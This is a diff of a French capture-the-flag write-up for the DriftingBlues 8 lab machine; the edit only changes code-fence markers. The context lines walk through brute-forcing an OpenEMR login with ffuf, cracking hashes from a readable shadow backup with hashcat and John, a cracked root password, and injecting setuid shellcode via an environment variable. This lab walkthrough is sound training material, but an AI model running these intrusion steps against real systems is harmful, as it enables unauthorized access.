@@ -10,7 +10,7 @@ Manquait à ma collection le numéro 8 de cette série de CTFs *DriftingBlues* t
 
 Ici les 8 autres épisodes de la saga ont été bien conçus c'est donc sans crainte que je plonge dans cette nouvelle aventure.  
 
-```plain
+```
 Nmap scan report for 192.168.56.14 
 Host is up (0.00019s latency). 
 Not shown: 65534 closed tcp ports (reset) 
@@ -36,7 +36,7 @@ Ensuite un fichier *wordlist.txt* qui contient une série de mots de passe.
 
 Tentons donc de casser un compte sur l'appli web avec cette liste :  
 
-```plain
+```
 $ ffuf -u "http://192.168.56.14/interface/main/main_screen.php?auth=login&site=default" \
   -X POST -H "Content-type: application/x-www-form-urlencoded" \
   -d "new_login_session_management=1&authProvider=Default&authUser=admin&clearPass=FUZZ&languageChoice=1"  \
@@ -99,7 +99,7 @@ $dbase  = 'openemr';
 
 Mais le plus frappant est la présence d'un fichier de sauvegarde du */etc/shadow* accessible en lecture :  
 
-```plain
+```
 www-data@driftingblues:/var$ ls backups/ -al 
 total 28 
 drwxr-xr-x  2 root root  4096 Jan 21 07:53 . 
@@ -110,7 +110,7 @@ drwxr-xr-x 12 root root  4096 Apr 25  2021 ..
 
 C'est le moment de lancer un [Penglab](https://github.com/mxrch/penglab) histoire de profiter des GPUs de Google pour casser le hash de l'utilisateur *clapton* :  
 
-```plain
+```
 !hashcat -m 1800 /tmp/hash.txt /content/wordlists/rockyou.txt
 ```
 
@@ -131,11 +131,11 @@ Je reviendrais plus tard sur ce binaire mais je me pose des questions : était-i
 
 Concernant la wordlist on peut en tout cas s'en servir pour casser le hash de l'utilisateur root lui aussi présent dans la backup du fichier *shadow*. Ça passe très bien avec *JohnTheRipper* :  
 
-```plain
+```
 .:.yarak.:.      (root)
 ```
 
-```plain
+```
 clapton@driftingblues:~$ su root 
 Password:  
 root@driftingblues:/home/clapton# cd 
@@ -223,7 +223,7 @@ printf("%s: %p\n", argv[1], getenv(argv[1]));
 
 Je me suis basé sur [un shellcode qui rajoute le bit setuid sur /bin/sh](https://www.exploit-db.com/shellcodes/43671).  
 
-```plain
+```
 clapton@driftingblues:~$ export SHELLCODE=`python -c "print '\x90' *100 + '\x31\xC0\x31\xDB\x31\xC9\x53\x68\x6E\x2F\x73\x68\x68\x2F\x2F\x62\x69\x89\xE3\x66\xB9\xFE\x10\x66\x81\xE9\x01\x07\xB0\x0F\xCD\x80\xB0\x0
 1\xCD\x80'"` 
 clapton@driftingblues:~$ ./mygetenv SHELLCODE 
